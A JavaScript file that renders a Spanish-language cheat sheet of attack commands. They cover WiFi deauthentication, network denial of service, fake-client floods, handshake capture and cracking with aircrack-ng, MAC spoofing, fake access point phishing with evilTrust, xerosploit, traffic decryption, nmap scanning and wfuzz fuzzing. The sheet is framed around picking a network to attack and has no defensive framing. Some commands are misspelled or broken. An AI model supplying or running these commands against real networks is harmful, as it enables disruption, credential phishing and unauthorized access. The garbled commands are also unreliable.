const main = document.getElementById("main");
const titulos = ["Ver tarjeta wifi:","Inicializar tarjeta modo monitor:","Cambiar mac tarjeta:","Ver mac OUI disponibles:","Asignar mac:","Inicializar interfaz wlan:", "Ver wifis:","Elegir wifi a atacar:","Desautenticacion de clientes (obtención handshake):","Dejar inoperativa una red:","Autenticar cliente fake:","Autenticar clientes fake de manera masiva:","Desautenticar a un cliente masivamente:","Validar handshake:","Fuerza bruta con Aircrack-ng:","Ataques graciosos xerosploit y sniff trafico con ssl:","Phising mediante AP fake (evilTrust):","Ver tráfico wifi (primero obtener handshake y conectarse):", "Buscar servicios y puertos con nmap:", "Buscar rutas disponibles en una web (Fuzzing)"];
const codigos = ["sudo ifconfig","sudo airmon-ng start “nombreinterfaz”","macchanger -s “interfaz(wlan0)”","macchanger -l","macchanger –mac=”oui:lo:qu:qui(el oui y lo que quiera)”","Ifconfig “interfaz(wlan0)” up","airodump-ng “interfaz”","airodumg-ng -c “numcanal” -w Captura --essid “nombrewifi” “interfaz(wlan0)","aireplay -ng -0 10 -e “nombrewifi” -c “maccliente” “interfaz(wlan0)”","aireplay -ng -0 0 -e “nombrewifi” “interfaz(wlan0)”","aireplay-ng -1 0 -e “nombrewifi) -h “mimac” “interfaz(wlan0)”","mdk3 wlan0mon a -a “mac red a atacar”", "1. nano blacklist 2. pegar mac cliente 3. mdk3 “interfaz” d –w blacklist -c “numerocanal”","pyrit -r “nombrecaptura” analyze","aircrack-ng -w “diccionario.txt” “captura”","1. cd /opt/xerosploit 2. ./xerosploit.py", "cd /opt/eviltrust", "1. airdecap-ng -e “ssid” -p “password” “captura” 2. Guarda una captura para abrir en wireshark","nmap -v ipmaquina","wfuzz -c --hc=404 -w rutadiccionario(/usr/share/wordlist/dirbuster/) http://urlweb/FUZZ"];


function textos (){
    main.innerHTML = "";

    const codigoEl = document.createElement("div");
    codigoEl.classList.add("container");

    for (i=0; i < titulos.length; i++){

        codigoEl.innerHTML += `
        <div class="tarjeta">
        <h2 class="titulo">${titulos[i]}</h2>
        <div class="codigo_bg">
        <p class="codigo">${codigos[i]}</p>
        </div>
        </div>
        `;
        main.appendChild(codigoEl);
    }
    
}

textos();